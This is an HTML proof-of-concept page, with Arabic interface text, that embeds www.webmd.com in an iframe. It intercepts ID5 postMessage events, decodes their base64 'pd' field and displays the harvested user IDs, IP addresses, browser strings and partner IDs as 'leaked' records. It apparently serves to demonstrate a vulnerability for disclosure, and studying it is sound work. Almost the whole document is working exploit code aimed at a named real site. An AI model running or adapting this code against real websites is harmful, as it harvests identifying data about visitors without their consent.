<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>✅ PoC: Information Disclosure via ID5 postMessage</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #1a1a2e; 
            color: #fff;
            padding: 20px;
        }
        .success { color: #4ecca3; }
        .panel { 
            background: #0f3460; 
            padding: 15px; 
            border-radius: 8px;
            margin: 10px 0;
        }
        .data-leak {
            background: #ff6b6b;
            color: white;
            padding: 10px;
            border-radius: 5px;
            margin: 5px 0;
        }
        iframe { 
            width: 100%; 
            height: 400px; 
            border: 3px solid #4ecca3;
        }
    </style>
</head>
<body>
    <h1>✅ PoC #1: Information Disclosure (مؤكد)</h1>
    
    <div class="panel">
        <h3>📊 البيانات المسربة التلقائية:</h3>
        <div id="results">في انتظار تحميل الصفحة...</div>
    </div>

    <iframe id="target" src="https://www.webmd.com" sandbox="allow-scripts allow-same-origin"></iframe>

    <script>
        const leakedData = [];

        window.addEventListener('message', (event) => {
            const data = event.data;
            
            // فقط رسائل ID5
            if (!data || !data._isId5Message) return;

            // استخراج البيانات من pd
            const instance = data.payload?.instance;
            const pd = instance?.pd || instance?.fetchIdData?.pd;

            if (pd) {
                try {
                    const decoded = decodeURIComponent(atob(pd));
                    
                    // تحليل البيانات
                    const info = {};
                    decoded.split('&').forEach(pair => {
                        const [key, value] = pair.split('=');
                        info[key] = decodeURIComponent(value || '');
                    });

                    const leak = {
                        timestamp: new Date().toLocaleTimeString(),
                        origin: event.origin,
                        userId: info['5'],        // معرف المستخدم
                        userAgent: info['12'],    // المتصفح
                        ipAddress: info['10'],    // عنوان IP
                        partnerId: instance?.sourceConfiguration?.options?.partnerId,
                        instanceId: instance?.id,
                        raw: decoded
                    };

                    leakedData.push(leak);
                    displayResults();

                } catch(e) {
                    console.error('Decode error:', e);
                }
            }
        });

        function displayResults() {
            const div = document.getElementById('results');
            
            if (leakedData.length === 0) {
                div.innerHTML = '<span class="success">⏳ في انتظار البيانات...</span>';
                return;
            }

            let html = `<div class="success">✅ تم تسريب ${leakedData.length} سجل!</div>`;
            
            leakedData.forEach((data, i) => {
                html += `
                    <div class="data-leak">
                        <b>سجل #${i+1} - ${data.timestamp}</b><br>
                        🔹 <b>User ID:</b> ${data.userId || 'null'}<br>
                        🔹 <b>IP Address:</b> ${data.ipAddress || 'N/A'}<br>
                        🔹 <b>Browser:</b> ${data.userAgent ? data.userAgent.substring(0, 60) + '...' : 'N/A'}<br>
                        🔹 <b>Partner ID:</b> ${data.partnerId || 'N/A'}<br>
                        🔹 <b>Instance ID:</b> ${data.instanceId}<br>
                        <hr style="border-color: rgba(255,255,255,0.3); margin: 10px 0;">
                        <small>المصدر: ${data.origin}</small><br>
                        <small>Raw: ${data.raw.substring(0, 100)}...</small>
                    </div>
                `;
            });
            
            div.innerHTML = html;
        }
    </script>
</body>
</html>
